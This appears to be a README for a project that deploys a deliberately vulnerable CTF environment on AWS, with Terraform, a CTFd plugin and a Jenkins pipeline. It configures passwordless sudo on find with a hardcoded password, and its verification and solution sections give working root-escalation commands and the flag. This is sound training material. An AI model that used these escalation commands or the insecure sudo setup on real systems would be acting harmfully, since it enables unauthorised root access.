# CTF Infrastructure - Automated Deployment System

> **Complete Infrastructure-as-Code solution for deploying CTF environments on AWS**

## 🎯 Overview

This project automates the deployment of a complete CTF (Capture The Flag) infrastructure including:

- **Vulnerable EC2 Instance**: Ubuntu 22.04 with sudo find privilege escalation
- **CTFd Platform**: Latest version via Docker Compose
- **Custom Plugin**: Environment validator with ICMP testing
- **Jenkins Pipeline**: Full automation for deployment
- **Modular Terraform**: Network and compute modules for AWS

## ✨ Features

| Task | Component | Status |
|------|-----------|--------|
| 1 | Vulnerable System Setup Scripts | ✅ Complete |
| 2 | Terraform Infrastructure (Modular) | ✅ Complete |
| 3 | CTFd Docker Deployment | ✅ Complete |
| 4 | CTFd Environment Validator Plugin | ✅ Complete |
| 5 | Jenkins Installation Script | ✅ Complete |
| 6 | Jenkins Pipeline (Jenkinsfile) | ✅ Complete |

## 📋 Prerequisites

- **AWS Account** with EC2/VPC permissions
- **Terraform** >= 1.0.0
- **AWS CLI** configured
- **Docker** and **Docker Compose**
- **Ubuntu 22.04** (for Jenkins)
- **SSH Key pair** for EC2 access

## 🚀 Quick Start

```bash
# 1. Clone repository
git clone https://github.com/alexmachulsky/ctf-infrastructure.git
cd ctf-infrastructure

# 2. Configure AWS
aws configure
# Region: ap-south-1

# 3. Generate SSH key
ssh-keygen -t rsa -b 4096 -f ~/.ssh/ctf-infrastructure-key.pem -N ""

# 4. Deploy infrastructure
cd terraform
terraform init
terraform apply

# 5. Get instance IP
export INSTANCE_IP=$(terraform output -raw vulnerable_instance_public_ip)

# 6. Wait for user-data to complete (2-3 minutes)
ssh -i ~/.ssh/ctf-infrastructure-key.pem ubuntu@${INSTANCE_IP} 'cloud-init status'

# 7. Access CTFd
echo "CTFd: http://${INSTANCE_IP}:8000"
```

## 📖 Detailed Setup

### Task 1: Vulnerable System

The setup script creates a sudo find vulnerability:

```bash
# Manual setup (optional - automated via Terraform)
sudo ./scripts/setup-vulnerable-system.sh

# Verify configuration
sudo ./scripts/verify-vulnerability.sh
```

**Configuration**:
- User: `ctf` / Password: `ctfpassword123`
- Sudo: `/usr/bin/find` without password
- Flag: `/root/flag.txt` (root-only)

### Task 2: Terraform Infrastructure

Modular Terraform configuration:

```bash
cd terraform

# Review configuration
cat terraform.tfvars.example

# Initialize and validate
terraform init
terraform validate

# Plan and apply
terraform plan -out=tfplan
terraform apply tfplan

# View outputs
terraform output -json > ../ctfd-plugin/infrastructure.json
```

**Modules**:
- `network/`: VPC, subnets, security groups, IGW
- `compute/`: EC2 instances, AMI creation

### Task 3: CTFd Deployment

Docker Compose stack with custom image:

```bash
# Get EC2 IP
INSTANCE_IP=$(cd terraform && terraform output -raw vulnerable_instance_public_ip)

# Upload docker files
cd docker
scp -i ~/.ssh/ctf-infrastructure-key.pem -r . ubuntu@${INSTANCE_IP}:~/docker/

# Deploy
ssh -i ~/.ssh/ctf-infrastructure-key.pem ubuntu@${INSTANCE_IP} \
  'cd ~/docker && sudo docker-compose up -d'

# Check status
ssh -i ~/.ssh/ctf-infrastructure-key.pem ubuntu@${INSTANCE_IP} \
  'sudo docker-compose -f ~/docker/docker-compose.yml ps'
```

Access: `http://INSTANCE_IP:8000`

### Task 4: CTFd Plugin

Environment validator plugin features:
- ICMP ping testing (CTFd → Vulnerable Instance)
- Admin UI at `/env-validator/admin`
- API endpoints: `/env-validator/validate`, `/env-validator/info`
- Reads `infrastructure.json` from Terraform

Test the plugin:
```bash
./scripts/test-ctfd-plugin.sh
```

### Task 5: Jenkins Installation

```bash
# Install Jenkins
sudo ./scripts/install-jenkins.sh

# Get initial password
sudo cat /var/lib/jenkins/secrets/initialAdminPassword

# Access Jenkins
open http://localhost:8080
```

### Task 6: Jenkins Pipeline

See detailed setup: [docs/JENKINS_SETUP.md](docs/JENKINS_SETUP.md)

**Pipeline Features**:
- Parameterized (apply/destroy, auto-approve)
- Terraform workflow automation
- CTFd deployment
- Vulnerability verification
- Manual approval gates

## 🧪 Verification

### Test Vulnerability

```bash
ssh ctf@${INSTANCE_IP}
# Password: ctfpassword123

# Check sudo
sudo -l

# Exploit to read flag
sudo find /root -name flag.txt -exec cat {} \;

# Or spawn root shell
sudo find / -name x -exec /bin/bash -p \;
```

### Test CTFd Plugin

```bash
# Run comprehensive test
./scripts/test-ctfd-plugin.sh

# Or test manually
curl http://${INSTANCE_IP}:8000/env-validator/info
```

## 🎓 CTF Challenge

**Objective**: Escalate from `ctf` user to root and capture the flag

**Access**:
```
ssh ctf@INSTANCE_IP
Password: ctfpassword123
```

**Difficulty**: Easy/Beginner

**Hints**:
<details>
<summary>Hint 1</summary>

Check sudo privileges:
```bash
sudo -l
```
</details>

<details>
<summary>Hint 2</summary>

The find command can execute other commands with `-exec`
</details>

<details>
<summary>Solution</summary>

```bash
# Method 1: Read flag directly
sudo find /root -name flag.txt -exec cat {} \;

# Method 2: Spawn root shell
sudo find / -name x -exec /bin/bash -p \;
cat /root/flag.txt
```

Flag: `CTF{sud0_f1nd_pr1v3sc_c0mpl3t3}`
</details>

**Learning Objectives**:
- Linux privilege escalation
- Sudo misconfiguration exploitation
- GTFOBins techniques
- Post-exploitation enumeration

## 💰 Cost Estimation

**AWS Costs** (ap-south-1/Mumbai):

| Resource | Type | Monthly Cost |
|----------|------|-------------|
| EC2 Instance | t2.micro | $8.47 |
| EBS Volume | gp2 8GB | $0.80 |
| Data Transfer | ~1GB | $0.09 |
| **Total** | | **~$9.36** |

**Cost Optimization**:
- Use AWS Free Tier (750 hrs/month t2.micro for 12 months)
- Run `terraform destroy` when not in use
- Stop instances instead of terminating

## 🔧 Troubleshooting

### Common Issues

**1. Terraform: "InvalidKeyPair.NotFound"**
```bash
aws ec2 import-key-pair \
  --key-name ctf-infrastructure-key \
  --public-key-material fileb://~/.ssh/ctf-infrastructure-key.pem.pub \
  --region ap-south-1
```

**2. CTFd not starting**
```bash
sudo docker-compose logs ctfd
sudo docker-compose down && sudo docker-compose up -d
```

**3. Plugin not loading**
```bash
# Check mount
sudo docker exec ctfd ls -la /opt/CTFd/CTFd/plugins/

# Restart
sudo docker-compose down
sudo docker-compose build ctfd
sudo docker-compose up -d
```

**4. SSH connection refused**
```bash
# Wait for user-data (first boot takes 2-3 minutes)
aws ec2 get-console-output --instance-id i-XXXXXX
```

**5. Ping fails in plugin**
```bash
# Verify ping installed in container
sudo docker exec ctfd which ping
sudo docker exec ctfd ping -c 2 10.0.1.100
```

## 📁 Project Structure

```
ctf-infrastructure/
├── README.md                       # This file
├── Jenkinsfile                     # Jenkins pipeline
│
├── docs/
│   └── JENKINS_SETUP.md            # Jenkins setup guide
│
├── scripts/
│   ├── setup-vulnerable-system.sh  # Configure vulnerability
│   ├── verify-vulnerability.sh     # Verify configuration
│   ├── install-jenkins.sh          # Install Jenkins
│   └── test-ctfd-plugin.sh         # Test plugin
│
├── terraform/                      # Infrastructure as Code
│   ├── main.tf
│   ├── variables.tf
│   ├── outputs.tf
│   └── modules/
│       ├── network/                # VPC, subnets, SGs
│       └── compute/                # EC2 instances
│
├── docker/
│   ├── docker-compose.yml          # CTFd stack
│   └── Dockerfile.ctfd             # Custom image with ping
│
└── ctfd-plugin/                    # Environment Validator
    ├── __init__.py
    ├── config.json
    └── templates/
        └── env_validator_admin.html
```

## ⚠️ Security Considerations

**WARNING**: This infrastructure is **intentionally vulnerable** for educational purposes.

**DO NOT**:
- Deploy to production
- Use on public networks without isolation
- Use real credentials
- Leave running unattended

**Best Practices**:
- Restrict security groups to your IP
- Use strong CTFd admin password
- Run `terraform destroy` when done
- Enable AWS CloudTrail
- Set billing alerts

## 📚 Additional Resources

- [Jenkins Setup Guide](docs/JENKINS_SETUP.md)
- [GTFOBins - find](https://gtfobins.github.io/gtfobins/find/)
- [CTFd Documentation](https://docs.ctfd.io/)
- [Terraform AWS Provider](https://registry.terraform.io/providers/hashicorp/aws/latest/docs)

## 👤 Author

**Alex Machulsky**
- GitHub: [@alexmachulsky](https://github.com/alexmachulsky)
- Repository: [ctf-infrastructure](https://github.com/alexmachulsky/ctf-infrastructure)

## 📄 License

MIT License - See LICENSE file

---

**Disclaimer**: For educational purposes only. Use in controlled environments only.
